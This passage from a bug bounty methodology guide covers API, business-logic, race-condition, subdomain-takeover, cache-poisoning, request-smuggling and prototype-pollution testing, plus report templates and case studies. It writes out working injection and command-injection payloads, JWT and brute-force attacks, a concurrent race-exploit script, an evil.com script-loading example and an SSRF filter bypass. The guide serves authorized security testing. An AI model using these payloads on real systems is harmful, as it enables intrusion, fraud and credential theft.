grep -rhoP "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" js_analysis/ | sort -u

# ═══════════════════════════════════════════════════════
# BEAUTIFY AND ANALYZE WEBPACK/MINIFIED JS
# ═══════════════════════════════════════════════════════

# Modern apps use webpack → chunked, minified JS
# Beautify first, then analyze:
# Tool: js-beautify
pip install jsbeautifier
js-beautify js_analysis/chunk123.js > js_analysis/chunk123_pretty.js

# Look for source maps (developer left .map files!)
# If app.js exists, try: app.js.map
curl -s https://target.com/static/js/main.abc123.js.map -o sourcemap.json
# Source maps contain the ORIGINAL source code!
# This is a goldmine for understanding application logic
```

---

## Technology Fingerprinting

### Comprehensive Technology Identification

```bash
# ═══════════════════════════════════════════════════════
# AUTOMATED FINGERPRINTING
# ═══════════════════════════════════════════════════════

# Tool: whatweb
whatweb https://target.com -v --colour never
# Identifies: CMS, frameworks, server software, scripts, cookies, headers

# Tool: wappalyzer (CLI version)
# npm install -g wappalyzer
wappalyzer https://target.com

# Tool: httpx with tech detection
httpx -u https://target.com -tech-detect -status-code -title

# ═══════════════════════════════════════════════════════
# MANUAL FINGERPRINTING TECHNIQUES
# ═══════════════════════════════════════════════════════

# HTTP Response Headers
curl -sI https://target.com

# Key headers to analyze:
# Server: nginx/1.18.0          → Nginx web server version
# X-Powered-By: Express         → Node.js Express framework
# X-Powered-By: PHP/7.4         → PHP version
# X-AspNet-Version: 4.0.30319   → .NET Framework version
# X-Generator: WordPress 6.0    → WordPress CMS
# X-Drupal-Dynamic-Cache        → Drupal CMS
# X-Django-Version               → Django framework
# X-Request-Id                   → Often reveals framework (UUID = Rails/Go)
# Set-Cookie: PHPSESSID          → PHP backend
# Set-Cookie: JSESSIONID         → Java backend
# Set-Cookie: ASP.NET_SessionId  → .NET backend
# Set-Cookie: connect.sid        → Node.js Express
# Set-Cookie: _csrf_token        → Rails or Django

# Error page analysis
curl https://target.com/nonexistent_path_xyz
# Default 404 pages vary by framework:
# "Not Found" (plain) → Nginx/Apache custom
# "Whitelabel Error Page" → Spring Boot
# "Cannot GET /path" → Express.js
# "Page not found (404)" → Django
# "The page you were looking for doesn't exist" → Rails
# "RESOURCE_NOT_FOUND" → API frameworks

# ═══════════════════════════════════════════════════════
# WHY TECHNOLOGY IDENTIFICATION MATTERS FOR BUG BOUNTY
# ═══════════════════════════════════════════════════════

# Each technology has known vulnerability patterns:

# WordPress:
# - Plugin vulnerabilities (wpscan --enumerate p)
# - XML-RPC brute force/DDoS amplification
# - User enumeration (?author=1)
# - wp-config.php.bak exposure
# - REST API user enumeration (/wp-json/wp/v2/users)

# Laravel (PHP):
# - Debug mode (APP_DEBUG=true) → full stack traces + env vars
# - .env file exposure
# - Deserialization (CVE-2018-15133)
# - Route disclosure (_ignition/health-check)

# Spring Boot (Java):
# - Actuator endpoints (/actuator, /env, /heapdump)
# - SpEL injection
# - Spring4Shell (CVE-2022-22965)
# - Path traversal in static resources

# Express/Node.js:
# - Prototype pollution
# - SSRF (request library quirks)
# - NoSQL injection (MongoDB)
# - Path traversal (..%2f encoding tricks)
# - Debug mode information disclosure

# Django (Python):
# - Debug mode (DEBUG=True) → settings, env vars
# - IDOR patterns (predictable PKs)
# - Admin panel (/admin/)
# - Template injection (SSTI)

# React/Angular/Vue (Frontend):
# - Source maps exposure (.js.map files)
# - Hidden admin routes in frontend code
# - API endpoints in JavaScript
# - State management secrets
```

---

## API Security Testing

### Complete API Testing Methodology

```bash
# ═══════════════════════════════════════════════════════
# API DISCOVERY
# ═══════════════════════════════════════════════════════

# Find API documentation endpoints
for endpoint in api/docs api/swagger swagger.json api/swagger.json \
  swagger/v1/swagger.json swagger-ui.html api-docs v1/api-docs \
  v2/api-docs openapi.json graphql .well-known/openapi.json; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$endpoint")
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "[+] $endpoint → HTTP $code"
  fi
done

# GraphQL introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{kind name description fields(includeDeprecated:true){name description args{name description type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}isDeprecated deprecationReason}inputFields{name description type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}interfaces{kind name ofType{kind name ofType{kind name ofType{kind name}}}}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}directives{name description locations args{name description type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}'

# ═══════════════════════════════════════════════════════
# AUTHENTICATION TESTING
# ═══════════════════════════════════════════════════════

# Test for broken authentication:

# 1. No authentication required
curl https://target.com/api/v1/users  # Works without token?

# 2. Weak token validation
curl -H "Authorization: Bearer invalid_token" https://target.com/api/v1/users
curl -H "Authorization: Bearer " https://target.com/api/v1/users  # Empty token
curl -H "Authorization: " https://target.com/api/v1/users  # Empty header

# 3. JWT attacks (detailed)
# Decode JWT payload
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.abc" | cut -d. -f2 | base64 -d 2>/dev/null

# None algorithm attack
# Original: {"alg":"HS256","typ":"JWT"}
# Modified: {"alg":"none","typ":"JWT"}
# Encode without signature

# Key confusion (RS256 → HS256)
# If server verifies RS256 with public key,
# and you switch to HS256, it may use that same public key
# as the HMAC secret — which you know!

# Tool: jwt_tool
python3 jwt_tool.py "$JWT" -M at           # All tests
python3 jwt_tool.py "$JWT" -C -d rockyou.txt  # Crack secret
python3 jwt_tool.py "$JWT" -T               # Tamper mode
python3 jwt_tool.py "$JWT" -I -hc alg -hv none -pc role -pv admin

# 4. API key enumeration
# Check if API key in URL is logged (proxy logs, analytics)
# Check if API key can be brute-forced
# Check if API key has excessive permissions

# ═══════════════════════════════════════════════════════
# AUTHORIZATION TESTING (BOLA/IDOR)
# ═══════════════════════════════════════════════════════

# The #1 bug in APIs (OWASP API Top 10 #1)

# Methodology:
# 1. Create Account A, perform all actions, note all IDs
# 2. Create Account B 
# 3. Using Account B's token, try to access Account A's resources

# Test every endpoint that uses an ID:
# GET /api/users/{id}
# GET /api/users/{id}/orders
# GET /api/orders/{id}
# PUT /api/users/{id}
# DELETE /api/posts/{id}
# GET /api/documents/{id}/download

# Automated IDOR testing:
# Use Burp Suite's Authorize extension
# 1. Configure with low-privilege user's token
# 2. Browse as high-privilege user
# 3. Authorize replays every request with low-priv token
# 4. Compare responses — if same → IDOR!

# ═══════════════════════════════════════════════════════
# MASS ASSIGNMENT / EXCESSIVE DATA EXPOSURE
# ═══════════════════════════════════════════════════════

# Mass Assignment: Setting properties the user shouldn't control

# Example: User registration
POST /api/register
{"username":"test","password":"test123","email":"test@test.com"}

# Try adding extra fields:
POST /api/register
{"username":"test","password":"test123","email":"test@test.com",
 "role":"admin","is_admin":true,"verified":true,"credits":99999}

# Excessive Data Exposure: API returns more data than needed
GET /api/users/me
# Response includes: password_hash, internal_id, admin_flag, 
# SSN, API keys, tokens, role, permissions...
# Even if UI doesn't show it, the API SENDS it

# ═══════════════════════════════════════════════════════
# RATE LIMITING TESTING
# ═══════════════════════════════════════════════════════

# Test for missing rate limits on sensitive endpoints:

# Login brute force
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@email.com","password":"attempt'$i'"}'
done
# If all return 200/401 without 429 → no rate limiting!

# Rate limit bypass techniques:
# 1. Add X-Forwarded-For header (different IP each request)
curl -H "X-Forwarded-For: 1.2.3.$i" ...
# 2. Add X-Real-IP header
# 3. Change case of endpoint: /API/Login vs /api/login
# 4. Add parameters: /api/login?x=1, /api/login?x=2
# 5. Use HTTP/2 multiplexing
# 6. IP rotation (proxies)

# ═══════════════════════════════════════════════════════
# INJECTION IN APIs
# ═══════════════════════════════════════════════════════

# SQL Injection in JSON
POST /api/search
{"query": "test' OR '1'='1"}
{"query": "test\" OR \"1\"=\"1"}
{"id": "1 UNION SELECT 1,2,3--"}

# NoSQL Injection (MongoDB)
POST /api/login
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": ""}}

# GraphQL Injection
{user(id: "1 OR 1=1") {name email}}

# Server-Side Template Injection via API
POST /api/render
{"template": "{{7*7}}"}
# If response contains 49 → SSTI!

# Command Injection
POST /api/ping
{"host": "8.8.8.8; id"}
{"host": "8.8.8.8\nid"}
{"host": "$(id)"}
```

---

## Business Logic Vulnerabilities

### Why Business Logic Bugs Pay Well

```
Business logic vulnerabilities:
- Cannot be found by automated scanners
- Require understanding of the application's purpose
- Often have high/critical impact
- Are unique to each application
- Require creative thinking
- Often overlooked by other researchers

They represent flaws in HOW the application works,
not technical implementation bugs.
```

### E-Commerce Logic Testing

```bash
# ═══════════════════════════════════════════════════════
# PRICE MANIPULATION
# ═══════════════════════════════════════════════════════

# Intercept purchase request, modify price
POST /api/checkout
{"product_id": 123, "quantity": 1, "price": 0.01}  # Changed from 99.99

# Negative prices
{"product_id": 123, "quantity": 1, "price": -50.00}  # Store credits?

# Negative quantity  
{"product_id": 123, "quantity": -1}  # Refund without purchase?

# Integer overflow
{"product_id": 123, "quantity": 2147483647}  # May wrap to negative

# Float precision
{"product_id": 123, "price": 0.000000001}  # Rounds to 0?

# Currency manipulation
{"product_id": 123, "price": 99.99, "currency": "VND"}  # Cheap currency?

# ═══════════════════════════════════════════════════════
# COUPON/DISCOUNT ABUSE
# ═══════════════════════════════════════════════════════

# Apply same coupon multiple times
POST /api/cart/coupon {"code": "SAVE50"}
POST /api/cart/coupon {"code": "SAVE50"}  # Apply again
POST /api/cart/coupon {"code": "SAVE50"}  # And again...
# Check if discount stacks!

# Apply multiple different coupons
POST /api/cart/coupon {"code": "SAVE50"}
POST /api/cart/coupon {"code": "WELCOME20"}
POST /api/cart/coupon {"code": "SUMMER30"}
# Total discount: 100%? More than 100%?

# Race condition on single-use coupon
# Send 50 simultaneous requests applying same code
# If database check isn't atomic → multiple uses

# Coupon code brute force
# If codes follow pattern (SAVE + numbers): SAVE001 through SAVE999
# If alphanumeric but short: brute force all combinations

# Transfer coupons between accounts
# Apply coupon on Account A
# Remove from cart on Account A
# Does it become available again? Use on Account B?

# ═══════════════════════════════════════════════════════
# PAYMENT FLOW BYPASS
# ═══════════════════════════════════════════════════════

# Skip payment step entirely
# Normal flow: Cart → Payment → Confirmation
# Attack: Cart → skip → Confirmation
# Try directly accessing the confirmation/order-placed endpoint

# Modify payment amount after cart total
# Cart shows $100 → Payment processor sees $0.01?
# Some integrations pass amount client-side

# Payment status manipulation
# Change callback from payment provider
POST /api/payment/callback
{"status": "success", "order_id": 12345, "amount": 100}
# Can you forge this callback?

# Refund abuse
# Purchase item → get digital goods → request refund
# Do you keep the digital goods?

# Gift card infinite money
# Purchase $100 gift card
# Apply gift card to purchase of another $100 gift card
# Net cost: $0, have new $100 gift card?

# ═══════════════════════════════════════════════════════
# WORKFLOW BYPASS
# ═══════════════════════════════════════════════════════

# Multi-step form bypass
# Step 1: Enter details → Step 2: Verify email → Step 3: Activate
# Attack: Skip step 2, go directly to step 3 endpoint

# Verification bypass
# Email verification: Find the activate endpoint, guess/brute token
# Phone verification: Skip, or inject verified state
# ID verification: Upload any document, change status before review

# Approval bypass
# Process: Submit → Admin reviews → Approved
# Attack: Directly change status to "approved" via API

# Two-factor authentication bypass
# Login → 2FA required → Enter code
# Try: After login, access protected resources without entering 2FA
# Some apps only check 2FA at login page, not on subsequent requests

# ═══════════════════════════════════════════════════════
# REFERRAL/REWARDS ABUSE
# ═══════════════════════════════════════════════════════

# Self-referral
# Create Account A with referral link
# Create Account B, use Account A's referral link
# Both get rewards?
# Repeat with Account C, D, E...

# Circular referral
# A refers B, B refers C, C refers A
# Infinite referral bonuses?

# Referral count manipulation
# Is the referral counter in a client-modifiable location?
# Can you directly call the "grant reward" endpoint?

# Trial period abuse
# Start trial → create new account → start trial → repeat
# Does deleting account and re-registering reset trial?
# Can you modify trial end date in local storage/cookies?
```

---

## Race Conditions

### Deep Technical Understanding

```
Race conditions occur when multiple operations execute concurrently 
and share state without proper synchronization.

In web applications, this typically means:
1. Two identical requests arrive simultaneously
2. Both read the "current state" before either modifies it
3. Both proceed based on the (now stale) state
4. Both make modifications, resulting in invalid state

VULNERABLE PATTERN (check-then-act without lock):
┌────────────────────────────────────────────────────────────────┐
│ Request A:   READ balance ($100) → CHECK ≥ $100 → DEDUCT $100 │
│ Request B:        READ balance ($100) → CHECK ≥ $100 → DEDUCT │
│                                                                │
│ Result: $200 withdrawn from $100 balance!                      │
└────────────────────────────────────────────────────────────────┘

SAFE PATTERN (atomic operation with lock):
┌────────────────────────────────────────────────────────────────┐
│ Request A:   LOCK → READ ($100) → CHECK → DEDUCT → UNLOCK     │
│ Request B:          WAIT... → LOCK → READ ($0) → CHECK FAILS  │
│                                                                │
│ Result: Only $100 withdrawn (correct)                          │
└────────────────────────────────────────────────────────────────┘
```

### Race Condition Exploitation

```python
#!/usr/bin/env python3
"""
Race condition exploitation framework.
Sends multiple concurrent requests to exploit TOCTOU vulnerabilities.
"""

import asyncio
import aiohttp
import time
from typing import List, Dict

class RaceConditionExploit:
    def __init__(self, url: str, method: str = "POST", 
                 headers: Dict = None, data: Dict = None,
                 num_requests: int = 20):
        self.url = url
        self.method = method
        self.headers = headers or {}
        self.data = data or {}
        self.num_requests = num_requests
        self.results = []
    
    async def send_single_request(self, session: aiohttp.ClientSession, 
                                   request_id: int) -> Dict:
        """Send a single request and capture the response."""
        start_time = time.time()
        try:
            if self.method == "POST":
                async with session.post(self.url, json=self.data, 
                                       headers=self.headers) as resp:
                    body = await resp.text()
                    return {
                        "id": request_id,
                        "status": resp.status,
                        "body": body[:500],
                        "time": time.time() - start_time
                    }
            else:
                async with session.get(self.url, headers=self.headers) as resp:
                    body = await resp.text()
                    return {
                        "id": request_id,
                        "status": resp.status,
                        "body": body[:500],
                        "time": time.time() - start_time
                    }
        except Exception as e:
            return {"id": request_id, "error": str(e)}
    
    async def exploit(self):
        """Send all requests concurrently."""
        connector = aiohttp.TCPConnector(limit=0)  # No connection limit
        async with aiohttp.ClientSession(connector=connector) as session:
            # Create all tasks
            tasks = [
                self.send_single_request(session, i) 
                for i in range(self.num_requests)
            ]
            # Execute ALL at once (maximum concurrency)
            self.results = await asyncio.gather(*tasks)
        
        return self.analyze_results()
    
    def analyze_results(self) -> str:
        """Analyze results for race condition indicators."""
        successes = [r for r in self.results if r.get("status") == 200]
        errors = [r for r in self.results if r.get("status", 0) >= 400]
        
        report = f"""
╔══════════════════════════════════════════╗
║      RACE CONDITION TEST RESULTS        ║
╠══════════════════════════════════════════╣
║ Total Requests:  {self.num_requests:<20}  ║
║ Successful (200): {len(successes):<19}  ║
║ Failed (4xx/5xx): {len(errors):<19}  ║
╚══════════════════════════════════════════╝
"""
        
        if len(successes) > 1:
            report += "\n⚠️  POTENTIAL RACE CONDITION DETECTED!"
            report += f"\n    {len(successes)} requests succeeded"
            report += "\n    (Expected: only 1 success for single-use resource)"
        
        return report

# Usage example: Test coupon application
async def test_coupon_race():
    exploit = RaceConditionExploit(
        url="https://target.com/api/apply-coupon",
        method="POST",
        headers={
            "Authorization": "Bearer YOUR_TOKEN",
            "Content-Type": "application/json"
        },
        data={"coupon_code": "ONETIME50"},
        num_requests=30
    )
    result = await exploit.exploit()
    print(result)

# Usage example: Test fund transfer
async def test_transfer_race():
    exploit = RaceConditionExploit(
        url="https://target.com/api/transfer",
        method="POST",
        headers={
            "Authorization": "Bearer YOUR_TOKEN",
            "Content-Type": "application/json"
        },
        data={"to_user": "attacker_id", "amount": 100},
        num_requests=50
    )
    result = await exploit.exploit()
    print(result)

if __name__ == "__main__":
    asyncio.run(test_coupon_race())
```

### Burp Suite Turbo Intruder (Single-Packet Attack)

```python
# Turbo Intruder script for race conditions
# Uses HTTP/2 single-packet attack for precise timing

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    
    # Queue 20 identical requests
    for i in range(20):
        engine.queue(target.req)
    
    # Send all at once using single-packet technique
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

---

## Subdomain Takeover

### Complete Subdomain Takeover Guide

```bash
# ═══════════════════════════════════════════════════════
# HOW SUBDOMAIN TAKEOVER WORKS
# ═══════════════════════════════════════════════════════

# Scenario:
# 1. company.com creates blog.company.com
# 2. blog.company.com → CNAME → company.ghost.io
# 3. Company stops using Ghost, deletes their Ghost account
# 4. DNS CNAME still points to company.ghost.io
# 5. Attacker creates Ghost account with matching domain
# 6. blog.company.com now shows attacker's content!

# Why this is dangerous:
# - Attacker controls content on trusted domain
# - Can steal cookies (if set on *.company.com)
# - Can host phishing pages on trusted domain
# - Can intercept OAuth flows if subdomain is whitelisted
# - Can serve malware from trusted source
# - CSP bypass if subdomain is in whitelist

# ═══════════════════════════════════════════════════════
# DETECTING TAKEOVER OPPORTUNITIES
# ═══════════════════════════════════════════════════════

# Step 1: Find all CNAME records
cat resolved_subdomains.txt | dnsx -cname -resp -o cnames.txt

# Step 2: Check for known vulnerable fingerprints

# Tool: subjack (checks common services)
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v

# Tool: nuclei with takeover templates
nuclei -l subdomains.txt -t http/takeovers/ -o takeover_results.txt

# Tool: can-i-take-over-xyz (reference database)
# https://github.com/EdOverflow/can-i-take-over-xyz

# ═══════════════════════════════════════════════════════
# VULNERABLE SERVICES & FINGERPRINTS
# ═══════════════════════════════════════════════════════

# Service: GitHub Pages
# CNAME: *.github.io
# Fingerprint: "There isn't a GitHub Pages site here."
# Takeover: Create repo with matching name, enable Pages

# Service: Heroku
# CNAME: *.herokuapp.com
# Fingerprint: "No such app" / "There's nothing here, yet."
# Takeover: Create app with matching name

# Service: AWS S3
# CNAME: *.s3.amazonaws.com / *.s3-website-*.amazonaws.com
# Fingerprint: "NoSuchBucket"
# Takeover: Create S3 bucket with matching name

# Service: Shopify
# CNAME: shops.myshopify.com
# Fingerprint: "Sorry, this shop is currently unavailable."
# Takeover: Create Shopify store, add custom domain

# Service: Azure (various)
# CNAME: *.azurewebsites.net, *.cloudapp.net, *.trafficmanager.net
# Fingerprint: Various 404 pages
# Takeover: Create matching Azure resource

# Service: Fastly
# CNAME: *.fastly.net
# Fingerprint: "Fastly error: unknown domain"
# Takeover: Configure Fastly CDN with matching domain

# Service: Pantheon
# CNAME: *.pantheonsite.io
# Fingerprint: "404 error unknown site!"
# Takeover: Create Pantheon site with matching domain

# Service: Zendesk
# CNAME: *.zendesk.com
# Fingerprint: "Help Center Closed"
# Takeover: Create Zendesk account with matching subdomain

# Service: Surge.sh
# CNAME: *.surge.sh
# Fingerprint: "project not found"
# Takeover: surge --domain matching-name.surge.sh

# ═══════════════════════════════════════════════════════
# ADVANCED TAKEOVER SCENARIOS
# ═══════════════════════════════════════════════════════

# NS delegation takeover (extremely critical!)
# If NS record points to nameserver you can register:
# sub.target.com → NS → ns1.expired-domain.com
# Buy expired-domain.com → control ALL DNS for sub.target.com

# MX record takeover
# If MX points to service you can claim:
# target.com MX → mail.cancelled-service.com
# Claim the service → receive ALL emails for target.com!

# CNAME chain takeover
# a.target.com → CNAME → b.other.com → CNAME → c.takeable.com
# If any link in the chain is takeable → you control the origin
```

---

## Report Writing

### What Makes a Great Bug Bounty Report

```
Great reports get:
- Faster triage (hours instead of days)
- Higher bounty awards (clear impact = higher payout)
- Better reputation
- Invitations to private programs
- Good relationship with security team

A report should be:
- Self-contained (reader needs no other context)
- Reproducible (anyone can follow steps and reproduce)
- Impact-focused (clear what damage an attacker could do)
- Professional (no threats, demands, or rudeness)
- Concise but complete (don't pad, don't skip)
```

### Report Template - Production Quality

```markdown
## Title
[Vulnerability Type] in [Feature/Endpoint] allows [Impact]

Good titles:
✅ "IDOR in /api/users/{id}/documents allows unauthorized access to any user's private documents"
✅ "Stored XSS in profile bio field leads to session hijacking"
✅ "SSRF via webhook URL allows reading AWS metadata credentials"

Bad titles:
❌ "Bug found"
❌ "XSS"
❌ "Security issue in your application"
❌ "CRITICAL BUG FIX IMMEDIATELY" (don't be dramatic)

## Severity
[Critical / High / Medium / Low]
CVSS 3.1 Score: X.X
Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

## Description
[2-3 sentences explaining:
 - What the vulnerability is
 - Where it exists
 - What an attacker can achieve]

## Environment
- URL: https://target.com/api/endpoint
- Tested on: Chrome 120, macOS
- Account type: Standard user
- Date tested: 2024-XX-XX

## Steps to Reproduce

### Prerequisites
[List what's needed to reproduce: accounts, data, tools]

### Step-by-Step
1. [First action - be specific with URLs, clicks, requests]
2. [Second action]
3. [Third action]
4. [Observe the vulnerability]

### HTTP Request (if applicable)
```http
POST /api/endpoint HTTP/1.1
Host: target.com
Authorization: Bearer [ATTACKER_TOKEN]
Content-Type: application/json

{"user_id": "victim_id", "action": "modify"}
```

### HTTP Response
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success": true, "data": {"victim_sensitive_data": "..."}}
```

## Proof of Concept
[Screenshots, video, or additional evidence]
[If accessing user data: REDACT personal information]
[Show exactly what an attacker sees/can do]

## Impact Assessment
[Explain realistic attack scenario:
 - Who can exploit this? (any user, unauthenticated, etc.)
 - What data is at risk?
 - How many users affected?
 - What's the worst-case scenario?]

## Suggested Remediation
[How to fix it - be specific:
 - Code-level fix suggestion
 - Architecture change if needed
 - Reference to security best practice]

## Supporting Material
- CWE Reference: CWE-XXX
- OWASP Reference: [relevant OWASP page]
- Similar CVEs: CVE-XXXX-XXXX

## Additional Notes
[Any other relevant information:
 - Related endpoints that may also be affected
 - Potential for escalation
 - Conditions under which this does NOT work]
```

---

## Advanced Techniques

### Web Cache Poisoning

```
Web cache poisoning serves malicious content to other users by
manipulating how caches store and serve responses.

How caches work:
┌──────────┐     ┌─────────────┐     ┌──────────────┐
│  Client  │────►│    Cache    │────►│  Origin      │
│ (User)   │     │ (CDN/Proxy) │     │  Server      │
└──────────┘     └─────────────┘     └──────────────┘

Cache stores responses based on a "cache key":
- Usually: Method + Host + Path + Query String
- NOT included: Most headers (X-Forwarded-Host, X-Original-URL)

Attack principle:
1. Find an "unkeyed" input (not in cache key)
2. Find where that input is reflected in the response
3. Send poisoned request (with malicious unkeyed input)
4. Cache stores the response
5. ALL subsequent users get the poisoned response!

Example:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com    ← Unkeyed (not in cache key)

Response (gets cached):
<script src="https://evil.com/malicious.js"></script>

Now every user visiting target.com gets the cached poisoned response!

Detection methodology:
1. Identify cache (headers: X-Cache, CF-Cache-Status, Age, Via)
2. Find unkeyed inputs (add headers, check if response changes)
3. Check reflection (does the unkeyed input appear in response?)
4. Verify caching (does repeated request serve cached version?)
5. Exploit (craft malicious payload in unkeyed input)

Common unkeyed inputs:
- X-Forwarded-Host
- X-Host
- X-Forwarded-Scheme
- X-Original-URL
- X-Rewrite-URL
- Cookies (sometimes)
- Accept-Language
```

### HTTP Request Smuggling

```
Request smuggling exploits discrepancies between how front-end
(reverse proxy/load balancer) and back-end servers parse HTTP requests.

The core issue: disagreement about where one request ends 
and the next begins.

Two relevant headers:
- Content-Length (CL): Specifies body size in bytes
- Transfer-Encoding (TE): Chunked encoding

Variant 1: CL.TE (Front uses CL, Back uses TE)
─────────────────────────────────────────────────
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0\r\n
\r\n
SMUGGLED

Front-end: Reads 13 bytes (includes "0\r\n\r\nSMUGGLED")
           Forwards entire request to back-end
Back-end:  Reads chunked → "0" = end of body
           "SMUGGLED" becomes start of NEXT request!

Variant 2: TE.CL (Front uses TE, Back uses CL)
─────────────────────────────────────────────────
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8\r\n
SMUGGLED\r\n
0\r\n
\r\n

Front-end: Reads chunked (complete request)
Back-end:  Reads 3 bytes of body ("8\r\n")
           Rest ("SMUGGLED...") becomes next request!

Impact of request smuggling:
- Bypass WAF/security controls
- Capture other users' requests
- Poison web cache
- Perform cross-user attacks
- Redirect responses to attacker
- Bypass access controls

Detection:
Use Burp Suite's HTTP Request Smuggler extension
Or manually test with timing-based detection
```

### Prototype Pollution (JavaScript)

```javascript
// ═══════════════════════════════════════════════════════
// UNDERSTANDING PROTOTYPE POLLUTION
// ═══════════════════════════════════════════════════════

// In JavaScript, every object inherits from Object.prototype
// If you can modify Object.prototype, ALL objects are affected

// Vulnerable pattern: recursive merge without prototype check
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Attack: 
let userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, userInput);

// Now:
let anyObject = {};
console.log(anyObject.isAdmin); // true!
// EVERY object now has isAdmin = true

// ═══════════════════════════════════════════════════════
// EXPLOITATION IN WEB APPS
// ═══════════════════════════════════════════════════════

// Via URL parameters:
// https://target.com/page?__proto__[isAdmin]=true
// https://target.com/page?constructor[prototype][isAdmin]=true

// Via JSON body:
// POST /api/settings
// {"__proto__": {"role": "admin"}}

// Via nested properties:
// {"constructor": {"prototype": {"isAdmin": true}}}

// ═══════════════════════════════════════════════════════
// REAL-WORLD IMPACT SCENARIOS
// ═══════════════════════════════════════════════════════

// 1. Authentication bypass
// If code checks: if (user.isAdmin) { grantAccess(); }
// Pollute: __proto__.isAdmin = true
// All users become admin!

// 2. DOM XSS via gadgets
// If template engine uses: element.innerHTML = obj.html || obj.template
// Pollute: __proto__.html = "<img src=x onerror=alert(1)>"
// XSS for all rendered objects!

// 3. Remote Code Execution (Node.js)
// If child_process.spawn or exec is used with default options:
// Pollute: __proto__.shell = true
//          __proto__.NODE_OPTIONS = "--require /proc/self/environ"
// Can achieve RCE!

// 4. Denial of Service
// Pollute: __proto__.toString = "not_a_function"
// Crashes any code that calls toString on objects!
```

---

## Case Studies

### Case Study 1: SSRF to AWS Account Compromise ($50,000)

```
Target: Major SaaS platform (HackerOne program)
Researcher: [Anonymous top-100 hacker]

Discovery Process:
1. During recon, found webhook configuration feature
2. Webhook URL was used by server to send notifications
3. Tested with Burp Collaborator → server made request (SSRF confirmed)
4. Attempted AWS metadata: blocked (IP blacklist)
5. Tried bypass: 
   - http://169.254.169.254 → BLOCKED
   - http://[::ffff:169.254.169.254] → BLOCKED
   - http://169.254.169.254.nip.io → BLOCKED
   - http://0xA9FEA9FE → SUCCESS! (hex representation bypassed filter)
6. Retrieved: /latest/meta-data/iam/security-credentials/
7. Found role: "production-webhook-processor"
8. Retrieved temporary AWS credentials
9. Using AWS CLI with stolen credentials:
   - Listed S3 buckets (contained user data)
   - Listed EC2 instances
   - Had broad IAM permissions

Impact: Full AWS account access, millions of user records at risk
Bounty: $50,000
Root cause: IP blacklist didn't account for hex IP representation
Fix: Allowlist approach + IMDSv2 (requires token for metadata)
```

### Case Study 2: Race Condition → Infinite Money ($25,000)

```
Target: Cryptocurrency exchange
Researcher: Security researcher on Bugcrowd

Discovery Process:
1. Exchange had "instant transfer" between wallets
2. Researcher had $100 in wallet
3. Tested simultaneous withdrawal requests
4. Used Python asyncio to send 50 concurrent $100 withdrawals
5. Result: 3 withdrawals succeeded ($300 from $100 balance)
6. Balance showed -$200 (negative!)
7. Repeated with smaller amounts: consistent 2-5x multiplication

Technical Root Cause:
- Balance check: SELECT balance FROM wallets WHERE user_id = ?
- Deduction: UPDATE wallets SET balance = balance - ? WHERE user_id = ?
- No database transaction isolation (READ COMMITTED instead of SERIALIZABLE)
- No SELECT ... FOR UPDATE (row-level locking)

Impact: Infinite money generation on the platform
Bounty: $25,000
Fix: Added database transaction with SERIALIZABLE isolation level
     Added SELECT ... FOR UPDATE before balance modification
     Added application-level mutex on withdrawal operations
```

### Case Study 3: Chained Bugs → Account Takeover ($15,000)

```
Target: Major e-commerce platform
Chain: IDOR + Information Disclosure + Password Reset = Full ATO

Step 1: Information Disclosure via IDOR
- GET /api/users/123/support-tickets → returned victim's email
- No authorization check on viewing other users' tickets

Step 2: Password Reset Manipulation
- POST /api/forgot-password {"email": "victim@email.com"}
- Reset email sent to victim
- BUT: Response included the reset token in JSON body!
  {"message": "Reset email sent", "debug_token": "abc123..."}
  (Debug info accidentally left in production)

Step 3: Account Takeover
- Used the token: POST /api/reset-password
  {"token": "abc123...", "new_password": "hacked"}
- Successfully changed victim's password
- Full account access

Individual severities:
- IDOR on support tickets: Medium ($500)
- Token in response: Medium ($500)
- Combined chain: Critical account takeover ($15,000)

Lesson: Always demonstrate the full attack chain for maximum impact
```

---

## Income Strategies

### Building Sustainable Bug Bounty Income

```
Phase 1: Learning (Months 1-6) — $0-$2,000 total
├── Focus on learning, not earning
├── Complete PortSwigger Academy
├── Practice on VDP programs (no bounty, but good for learning)
├── Submit your first reports (expect some duplicates/invalids)
└── Build methodology and tooling

Phase 2: Growing (Months 6-18) — $500-$3,000/month
├── Found your first few valid bugs
├── Signal/reputation growing
├── Getting invited to some private programs
├── Developing specialization
└── Automation pipeline working

Phase 3: Consistent (Months 18-36) — $3,000-$15,000/month
├── Multiple valid reports per month
├── Access to many private programs
├── Strong reputation on platforms
├── Known by security teams
└── Possibly receiving live hacking event invitations

